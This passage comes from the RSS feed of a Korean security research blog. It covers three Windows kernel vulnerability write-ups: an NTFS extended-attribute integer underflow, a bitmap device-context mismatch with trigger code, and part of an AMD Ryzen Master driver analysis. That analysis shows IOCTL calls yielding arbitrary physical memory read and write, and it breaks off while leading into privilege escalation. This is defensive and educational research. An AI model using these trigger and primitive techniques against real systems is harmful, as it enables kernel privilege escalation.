&#xACF5;&#xACA9;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xD55C; &#xC81C;&#xB85C;&#xB370;&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>ntfs.sys</code> &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC758; <code>NtfsQueryEaUserEaList</code>&#xB77C;&#xB294; &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">NtfsQueryEaUserEaList</span><span class="hljs-params">(__int64 a1, __int64 eas_blocks_for_file, __int64 a3, __int64 out_buf, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> out_buf_length, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *a6, <span class="hljs-keyword">char</span> a7)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> padding; <span class="hljs-comment">// er15</span>  padding = <span class="hljs-number">0</span>;   <span class="hljs-keyword">for</span> ( i = a6; ; i = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">char</span> *)i + *i) )    {      <span class="hljs-keyword">if</span> ( i == v11 )      {        v15 = occupied_length;        out_buf_pos = (_DWORD *)(out_buf + padding + occupied_length);        <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> __int8)NtfsLocateEaByName(                                ea_blocks_for_file,                                *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(a3 + <span class="hljs-number">4</span>),                                &amp;DestinationString,                                &amp;ea_block_pos) )        {          ea_block = (FILE_FULL_EA_INFORMATION *)(ea_blocks_for_file + ea_block_pos);          ea_block_size = ea_block-&gt;EaNameLength + ea_block-&gt;EaValueLength + <span class="hljs-number">9</span>;           <span class="hljs-comment">// Attacker controlled from Ea</span>          <span class="hljs-keyword">if</span> ( ea_block_size &lt;= out_buf_length - padding )                                <span class="hljs-comment">// The check which can underflow</span>          {            memmove(out_buf_pos, ea_block, ea_block_size);            *out_buf_pos = <span class="hljs-number">0</span>;            <span class="hljs-keyword">goto</span> LABEL_8;          }        }           *((_BYTE *)out_buf_pos + *((<span class="hljs-keyword">unsigned</span> __int8 *)v11 + <span class="hljs-number">4</span>) + <span class="hljs-number">8</span>) = <span class="hljs-number">0</span>;LABEL_8:            v18 = ea_block_size + padding + v15;            occupied_length = v18;            <span class="hljs-keyword">if</span> ( !a7 )            {              <span class="hljs-keyword">if</span> ( v23 )                *v23 = (_DWORD)out_buf_pos - (_DWORD)v23;              <span class="hljs-keyword">if</span> ( *v11 )              {                v23 = out_buf_pos;                out_buf_length -= ea_block_size + padding;                padding = ((ea_block_size + <span class="hljs-number">3</span>) &amp; <span class="hljs-number">0xFFFFFFFC</span>) - ea_block_size;                <span class="hljs-keyword">goto</span> LABEL_24;              }            }</code></pre><p>&#xC774; &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; &#xBC18;&#xBCF5;&#xBB38;&#xC744; &#xB3CC;&#xBA74;&#xC11C; NTFS Ea(Extended Attribute)&#xC758; &#xB0B4;&#xC6A9;&#xC744; output buffer&#xC5D0; &#xBCF5;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;. &#xBCF5;&#xC0AC;&#xD560; &#xB0B4;&#xC6A9;&#xC758; &#xAE38;&#xC774;&#xB294; <code>ea_block_size = ea_block-&gt;EaNameLength + ea_block-&gt;EaValueLength + 9;</code>&#xB97C; &#xD1B5;&#xD574; EA &#xC774;&#xB984;&#xC758; &#xAE38;&#xC774;&#xC640; &#xAC12;&#xC758; &#xAE38;&#xC774;&#xC5D0; 9&#xB97C; &#xB354;&#xD574; &#xACC4;&#xC0B0; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xBCF5;&#xC0AC; &#xC9C1;&#xC804;&#xC5D0;&#xB294; <code>ea_block_size &lt;= out_buf_length - padding</code>&#xB97C; &#xD1B5;&#xD574; &#xBCF5;&#xC0AC;&#xD560; &#xBE14;&#xB85D;&#xC758; &#xC0AC;&#xC774;&#xC988;&#xAC00; &#xB0A8;&#xC740; output buffer&#xC758; &#xC0AC;&#xC774;&#xC988;&#xBCF4;&#xB2E4; &#xD070;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. &#xBCF5;&#xC0AC;&#xB41C; &#xB0B4;&#xC6A9;&#xC740; 32&#xBE44;&#xD2B8;&#xB85C; &#xC815;&#xB82C;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774; &#xB54C; &#xC774;&#xC804; &#xBE14;&#xB85D;&#xC758; &#xC0AC;&#xC774;&#xC988;&#xC5D0; &#xB9DE;&#xCDB0; <code>padding = ((ea_block_size + 3) &amp; 0xFFFFFFFC) - ea_block_size;</code>&#xB85C; &#xACC4;&#xC0B0;&#xB41C; &#xD328;&#xB529; &#xC0AC;&#xC774;&#xC988;&#xB97C; &#xBE7C;&#xACE0; &#xACC4;&#xC0B0; &#xB429;&#xB2C8;&#xB2E4;. &#xC989; padding &#xC0AC;&#xC774;&#xC988;&#xB294; 1~3 &#xC0AC;&#xC774;&#xC758; &#xAC12;&#xC744; &#xAC00;&#xC9C0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. out_buf_length&#xB294; &#xC778;&#xC790;&#xB85C; &#xC804;&#xB2EC;&#xB41C; &#xAC12;&#xC5D0;&#xC11C; ea_black_size&#xC640; padding&#xC744; &#xB354;&#xD55C; &#xAC12;&#xC744; &#xACC4;&#xC18D; &#xBE8D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xB2E4;&#xBA74; &#xC6B0;&#xC5F0;&#xD788; &#xC815;&#xD655;&#xD558;&#xAC8C; out_buf_length&#xAC00; &#xB531; &#xC815;&#xD655;&#xD788; 0&#xC774; &#xB420; &#xC0C1;&#xD669;&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xACA0;&#xC8E0;? &#xB124;. out_buf_length&#xAC00; 0&#xC774; &#xB418;&#xB294; &#xC21C;&#xAC04; <code>ea_block_size &lt;= out_buf_length - padding</code>&#xC5D0;&#xC11C; integer underflow&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xB2E4;&#xC74C; EA &#xBE14;&#xB7ED;&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; output buffer&#xAC00; &#xD560;&#xB2F9;&#xB41C; &#xBC14;&#xB85C; &#xB4A4;&#xC758; &#xBC84;&#xD37C;&#xC5D0; &#xB36E;&#xC5B4;&#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. output buffer&#xB294; pool&#xB85C; &#xD560;&#xB2F9;&#xC774; &#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; pool overflow? oob write? &#xAC00; &#xB418;&#xACA0;&#xB124;&#xC694;.</p><p>&#xC774; &#xAE00;&#xC5D0;&#xC11C;&#xB294; &#xCDE8;&#xC57D;&#xC810; &#xB0B4;&#xC6A9;&#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; &#xD2B8;&#xB9AC;&#xAC70; &#xBC29;&#xBC95;, &#xC775;&#xC2A4; &#xBC29;&#xBC95;&#xC5D0; &#xB300;&#xD55C; &#xB0B4;&#xC6A9;&#xB3C4; &#xB2E4;&#xB8E8;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; 2&#xD3B8;&#xC5D0;&#xC11C;&#xB294; reliable&#xD558;&#xAC8C; &#xC775;&#xC2A4;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xB2E4;&#xB8EC;&#xB2E4;&#xACE0; &#xD558;&#xB2C8; &#xAD00;&#xC2EC; &#xC788;&#xC73C;&#xC2E0; &#xBD84;&#xB4E4;&#xC740; &#xD55C;&#xBC88; &#xC0B4;&#xD3B4;&#xBCF4;&#xC2DC;&#xAE38; &#xBC14;&#xB78D;&#xB2C8;&#xB2E4;. &#xC800;&#xB3C4; angr &#xC2DC;&#xB9AC;&#xC988;&#xAC00; &#xB05D;&#xB098;&#xBA74; &#xC708;&#xB3C4;&#xC6B0; &#xCEE4;&#xB110; &#xCDE8;&#xC57D;&#xC810;&#xB4E4; &#xBD84;&#xC11D;&#xD574;&#xC11C; &#xC5F0;&#xAD6C;&#xAE00; &#xC62C;&#xB824;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/ntfs/">ntfs</category>
      
      <category domain="https://hackyboiz.github.io/tags/wnf/">wnf</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve-2021-31956/">cve-2021-31956</category>
      
      
      <comments>https://hackyboiz.github.io/2021/07/30/j0ker/2021-07-30/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-27077: SELECTING BITMAPS INTO MISMATCHED DEVICE CONTEXTS</title>
      <link>https://hackyboiz.github.io/2021/07/29/idioth/2021-07-29/</link>
      <guid>https://hackyboiz.github.io/2021/07/29/idioth/2021-07-29/</guid>
      <pubDate>Thu, 29 Jul 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/7/26/cve-2021</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/7/26/cve-2021-27077-selecting-bitmaps-into-mismatched-device-contexts">CVE-2021-27077: SELECTING BITMAPS INTO MISMATCHED DEVICE CONTEXTS</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows&#xC5D0;&#xC11C; device context&#xC5D0;&#xC11C; bitmap&#xC744; &#xC120;&#xD0DD;&#xD558;&#xC5EC; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xBC0F; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Device context&#xB294; Windows&#xC5D0;&#xC11C; &#xD53D;&#xC140; &#xAE30;&#xBC18; &#xC7A5;&#xCE58;&#xC5D0; &#xBB34;&#xC5B8;&#xAC00;&#xB97C; &#xADF8;&#xB9AC;&#xAE30; &#xC704;&#xD574; &#xC81C;&#xACF5;&#xB429;&#xB2C8;&#xB2E4;. Device context&#xB294; user-mode code&#xC640; low-level device driver &#xC0AC;&#xC774;&#xC5D0; &#xCD94;&#xC0C1; &#xACC4;&#xCE35;&#xC774;&#xBA70; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xCC98;&#xB7FC; &#xC791;&#xB3D9;&#xD569;&#xB2C8;&#xB2E4;. Screen-related&#xC640; print-related &#xC77C; &#xC218; &#xC788;&#xC73C;&#xBA70; device context&#xB294; &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC; &#xC0C1;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xD544;&#xB4DC; &#xC911; <code>hdev</code> &#xD544;&#xB4DC;&#xB294; &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xB2E4;&#xB978; &#xAC1D;&#xCCB4;&#xC5D0; &#xB300;&#xD55C; &#xD3EC;&#xC778;&#xD130;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; bitmap&#xC740; surface object&#xB85C; &#xD45C;&#xD604;&#xB418;&#xBA70; &#xC774; &#xAD6C;&#xC870;&#xCCB4; &#xB610;&#xD55C; <code>hdev</code>&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. printer-related device context&#xC640; screen-related device context&#xB97C; &#xD558;&#xB098;&#xC529; &#xC0DD;&#xC131;&#xD55C; &#xD6C4;, &#xBAA8;&#xB4E0; device context&#xC5D0;&#xC11C; &#xD638;&#xD658; &#xAC00;&#xB2A5;&#xD55C; monochrome (1 bite deep) bitmap&#xC744; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xD6C4; Printer DC&#xC5D0;&#xC11C; bitmap&#xC744; &#xC120;&#xD0DD;&#xD558;&#xBA74; bitmap&#xC758; <code>hdev</code>&#xB294; &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; printer device object&#xB97C; &#xAC00;&#xB9AC;&#xD0B5;&#xB2C8;&#xB2E4;. &#xADF8; &#xD6C4; bitmap &#xC120;&#xD0DD;&#xC744; &#xD574;&#xC81C;&#xD55C; &#xD6C4; &#xB2E4;&#xC2DC; Screen DC&#xC5D0;&#xC11C; bitmap&#xC744; &#xC120;&#xD0DD;&#xD558;&#xBA74; <code>hdev</code> &#xD544;&#xB4DC;&#xB294; screen device object&#xB97C; &#xAC00;&#xB9AC;&#xD0B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCF54;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lisp">DCPrn = CreateCompatibleDC(<span class="hljs-name">CreateDC</span>(<span class="hljs-string">&quot;Microsoft XPS Document Writer&quot;</span>, <span class="hljs-string">&quot;Microsoft XPS Document Writer&quot;</span>, NULL, NULL))<span class="hljs-comment">; </span>DCScr = CreateCompatibleDC(<span class="hljs-number">0</span>)<span class="hljs-comment">; </span> Bitmap = CreateBitmap(<span class="hljs-number">100</span>, <span class="hljs-number">100</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, NULL)<span class="hljs-comment">; </span> PrevBitmap = SelectObject(<span class="hljs-name">DCPrn</span>, Bitmap)<span class="hljs-comment">; // Bitmap&apos;s hdev is set to DCPrn&apos;s hdev </span>SelectObject(<span class="hljs-name">DCPrn</span>, PrevBitmap)<span class="hljs-comment">; </span> SelectObject(<span class="hljs-name">DCScr</span>, Bitmap)<span class="hljs-comment">;              // Bitmap&apos;s hdev is set to DCScr&apos;s hdev</span></code></pre><p>&#xD504;&#xB9B0;&#xD130; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC758; &#xBCF4;&#xC548;&#xC744; &#xC704;&#xD574;&#xC11C; Windows Vista&#xAE4C;&#xC9C0;&#xB294; kernel-mode&#xC640; user-mode&#xC5D0; &#xD504;&#xB9B0;&#xD130; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xAC00; &#xACF5;&#xC874;&#xD558;&#xC600;&#xC9C0;&#xB9CC;, &#xADF8; &#xC774;&#xD6C4;&#xC5D0;&#xB294; user-mode driver&#xB9CC; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xD504;&#xB9B0;&#xD130;&#xC5D0; &#xB300;&#xD55C; &#xCC98;&#xB9AC;&#xB97C; &#xC704;&#xD574; &#xCEE4;&#xB110;&#xC5D0;&#xB294; user-mode&#xC5D0; &#xB300;&#xD55C; &#xCF5C;&#xBC31;&#xC744; &#xB9CC;&#xB4DC;&#xB294; stub&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. user-mode &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC77C;&#xBD80; kernel-mode API&#xC5D0;&#xB294; user-mode API&#xB3C4; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xC911; <code>EngAssociateSurface</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; <code>hdev</code>, <code>dhpdev</code>, <code>flHooks</code>&#xB97C; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD558;&#xC5EC; flHooks&#xB97C; &#xD1B5;&#xD574; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xBC0F; &#xB2E4;&#xB978; &#xC545;&#xC6A9;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>SelectObject</code>&#xC5D0;&#xC11C; <code>win32kbase.sys!blsSurfaceAllowedInDC</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; surface object&#xB97C; &#xAC80;&#xC0AC;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/printer/">printer</category>
      
      <category domain="https://hackyboiz.github.io/tags/bitmap/">bitmap</category>
      
      <category domain="https://hackyboiz.github.io/tags/device-object/">device object</category>
      
      
      <comments>https://hackyboiz.github.io/2021/07/29/idioth/2021-07-29/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] 공대오빠가 알려주는 Windows Driver Part 3 - CVE-2020-12928: AMD Ryzen Master 분석(2)</title>
      <link>https://hackyboiz.github.io/2021/07/28/l0ch/windows-driver-part3/</link>
      <guid>https://hackyboiz.github.io/2021/07/28/l0ch/windows-driver-part3/</guid>
      <pubDate>Wed, 28 Jul 2021 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;&amp;#xC2DC;&amp;#xB9AC;&amp;#xC988;-&amp;#xBC14;&amp;#xB85C;&amp;#xAC00;&amp;#xAE30;&quot;&gt;&lt;a href=&quot;#&amp;#xC2DC;&amp;#xB9AC;&amp;#xC988;-&amp;#xBC14;&amp;#xB85C;&amp;#xAC00;&amp;#xAE30;&quot; clas</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="&#xC2DC;&#xB9AC;&#xC988;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;"><a href="#&#xC2DC;&#xB9AC;&#xC988;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;" class="headerlink" title="&#xC2DC;&#xB9AC;&#xC988; &#xBC14;&#xB85C;&#xAC00;&#xAE30;"></a>&#xC2DC;&#xB9AC;&#xC988; &#xBC14;&#xB85C;&#xAC00;&#xAE30;</h1><p><a href="https://hackyboiz.github.io/2021/05/30/l0ch/windows-driver/">&#xACF5;&#xB300;&#xC624;&#xBE60;&#xAC00; &#xC54C;&#xB824;&#xC8FC;&#xB294; Windows Driver Part 1 - Setting Up Kernel Debugging</a></p><p><a href="https://hackyboiz.github.io/2021/07/14/l0ch/windows-driver-part2/">&#xACF5;&#xB300;&#xC624;&#xBE60;&#xAC00; &#xC54C;&#xB824;&#xC8FC;&#xB294; Windows Driver Part 2 - CVE-2020-12928: AMD Ryzen Master &#xBD84;&#xC11D;(1)</a></p><p>&#xACF5;&#xB300;&#xC624;&#xBE60;&#xAC00; &#xC54C;&#xB824;&#xC8FC;&#xB294; Windows Driver Part 3 - CVE-2020-12928: AMD Ryzen Master &#xBD84;&#xC11D;(2) &#x2190; Now!</p><p><a href="http://hackyboiz.github.io/2021/08/11/l0ch/windows-driver-part4/">&#xACF5;&#xB300;&#xC624;&#xBE60;&#xAC00; &#xC54C;&#xB824;&#xC8FC;&#xB294; Windows Driver Part 4 - CVE-2020-12928: AMD Ryzen Master &#xBD84;&#xC11D;(3)</a></p><hr><p>&#xC800;&#xBC88; &#xD30C;&#xD2B8;&#xC5D0; &#xC774;&#xC5B4; &#xBC14;&#xB85C; &#xBD84;&#xC11D;&#xC744; &#xC774;&#xC5B4;&#xAC00;&#xB3C4;&#xB85D; &#xD560;&#xAC8C;&#xC694;!</p><p>IOCTL <code>0x81112F08</code>&#xC740; &#xC55E;&#xC11C; &#xC124;&#xBA85;&#xD588;&#xB4EF;&#xC774; &#xBB3C;&#xB9AC; &#xC8FC;&#xC18C;&#xB97C; &#xBC1B;&#xC544; &#xB9E4;&#xD551;&#xB41C; &#xAC00;&#xC0C1; &#xC8FC;&#xC18C;&#xC758; &#xAC12;&#xC744; &#xC77D;&#xB294; &#xB8E8;&#xD2F4;&#xC744; &#xAC00;&#xC9C4; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;. </p><p>&#xC6B0;&#xC120; Windbg&#xC5D0;&#xC11C; <code>0x81112F08</code>&#xB8E8;&#xD2F4; <code>sub_1400063D0</code>&#xC744; &#xD638;&#xCD9C;&#xD55C; &#xC9C1;&#xD6C4;&#xC778; <code>AMDRyzenMasterDriver+0x63d5</code> &#xC704;&#xCE58;&#xC5D0; &#xBE0C;&#xB808;&#xC774;&#xD06C;&#xD3EC;&#xC778;&#xD2B8;&#xB97C; &#xAC78;&#xACE0;, input buffer&#xC5D0; &#xB300;&#xCDA9; &#xC544;&#xBB34; &#xAC12;&#xC774;&#xB098; &#xB123;&#xACE0; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p>&#xCEE4;&#xB110; &#xB514;&#xBC84;&#xAE45; &#xC138;&#xD305;&#xC740; Part 1&#xC5D0; &#xC124;&#xBA85;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></blockquote><pre><code class="hljs c">BYTE input_buff[<span class="hljs-number">0x1000</span>] = { <span class="hljs-number">0x41</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x41</span> ,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>};<span class="hljs-comment">// 0x4141414141414141</span><span class="hljs-comment">// 0x0000000000000001</span>DeviceIoControl(dHandle, <span class="hljs-number">0x81112F08</span>, input_buff, <span class="hljs-number">0x40</span>, output_buff, <span class="hljs-number">0x100c</span>, &amp;dwRet, <span class="hljs-number">0</span>))</code></pre><p><img src="/2021/07/28/l0ch/windows-driver-part3/2.png" alt="windows-driver-part3/2.png"></p><p>input buffer&#xC758; <code>0x4141414141414141</code>&#xACFC; <code>0x00000001</code>&#xC774; <code>sub_1400063D0</code>&#xC758; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; &#xCC28;&#xB840;&#xB300;&#xB85C; &#xB4E4;&#xC5B4;&#xAC04; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xB124;&#xC694;. <del>&#xB09C; &#xC800; 0x41414141 &#xBCFC; &#xB54C; &#xAE30;&#xBD84;&#xC774; &#xC81C;&#xC77C; &#xC88B;&#xB354;&#xB77C;</del>  &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB97C; &#xB2E4;&#xC2DC; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/07/28/l0ch/windows-driver-part3/Untitled.png" alt="windows-driver-part3/Untitled.png"></p><p><code>a1</code> &#x2192; <code>0x4141414141414141</code> &#xACFC; <code>a2</code>&#x2192;<code>0x00000001</code>  &#xAC00; <code>MmMapIoSpace</code> &#xD568;&#xC218;&#xC758; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; &#xC804;&#xB2EC;&#xB429;&#xB2C8;&#xB2E4;.</p><p><code>a3</code>&#xB294; &#xB9E4;&#xD551;&#xB41C; &#xAC00;&#xC0C1; &#xC8FC;&#xC18C;&#xC758; &#xAC12;&#xC774; &#xB4E4;&#xC5B4;&#xAC00;&#xB294; &#xACF5;&#xAC04;&#xC774;&#xB2C8; output&#xC774; &#xB418;&#xACA0;&#xB124;&#xC694;.  </p><blockquote><p><code>0x81112F08</code>&#xC740; <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/defining-i-o-control-codes">METHOD_BUFFERED</a>&#xB85C; input buffer&#xC640; output buffer&#xAC00; &#xB3D9;&#xC77C;&#xD569;&#xB2C8;&#xB2E4;.</p></blockquote><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>    INT64 read_addr;     DWORD num_of_bytes;} READ_INPUT_BUFFER;</code></pre><p><code>0x81112F08</code>&#xC758; input buffer structure&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xAD6C;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xC81C; user input&#xC744; &#xD1B5;&#xD574; <code>0x81112F08</code> &#xB8E8;&#xD2F4;&#xC758; <code>MmMapIoSpace</code>&#xC5D0; &#xC784;&#xC758;&#xC758; &#xBB3C;&#xB9AC; &#xC8FC;&#xC18C;&#xC640; &#xB9E4;&#xD551; &#xC0AC;&#xC774;&#xC988;&#xB97C; &#xC904; &#xC218; &#xC788;&#xACE0; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xC5D0; &#xB9E4;&#xD551;&#xB41C; &#xAC00;&#xC0C1; &#xC8FC;&#xC18C;&#xB97C; &#xC77D;&#xC744; &#xC218; &#xC788;&#xC5B4; arbitrary read&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xBC18;&#xB300;&#xB85C; &#xBB3C;&#xB9AC; &#xC8FC;&#xC18C;&#xC5D0; &#xB9E4;&#xD551;&#xB41C; &#xAC00;&#xC0C1; &#xC8FC;&#xC18C;&#xC5D0; &#xAC12;&#xC744; &#xC4F0;&#xB294; <code>0x81112F0C</code> &#xC758; &#xB8E8;&#xD2F4;&#xB3C4; &#xB3D9;&#xC77C;&#xD55C; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; &#xC804;&#xB2EC;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB9E4;&#xD551;&#xB41C; &#xAC00;&#xC0C1; &#xC8FC;&#xC18C;&#xC5D0; &#xC6B0;&#xB9AC;&#xAC00; &#xC784;&#xC758;&#xC758; &#xAC12;&#xC744; &#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>arbitrary read/write primitive&#xB97C; &#xBAA8;&#xB450; &#xC5BB;&#xC5C8;&#xB124;&#xC694;! &#xC774;&#xC81C; &#xC774;&#xAC78; &#xC774;&#xC6A9;&#xD574; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><h1 id="EPROCESS"><a href="#EPROCESS" class="headerlink" title="EPROCESS"></a>EPROCESS</h1><p>&#xC774;&#xC81C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB97C; &#xAD6C;&#xC0C1;&#xD574;&#xC57C; &#xD558;&#xB294;&#xB370;, &#xADF8;&#xC804;&#xC5D0; &#xBA3C;&#xC800; Windows&#xC758; &#xAD8C;&#xD55C;&#xACFC; EPROCESS&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xBD10;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. </p><p>Windows&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD574; EPROCESS, KPROCESS, ETHREAD, KTHREAD, PEB, PCB &#xB4F1;&#xC758; &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xC911; EPROCESS&#xB294; 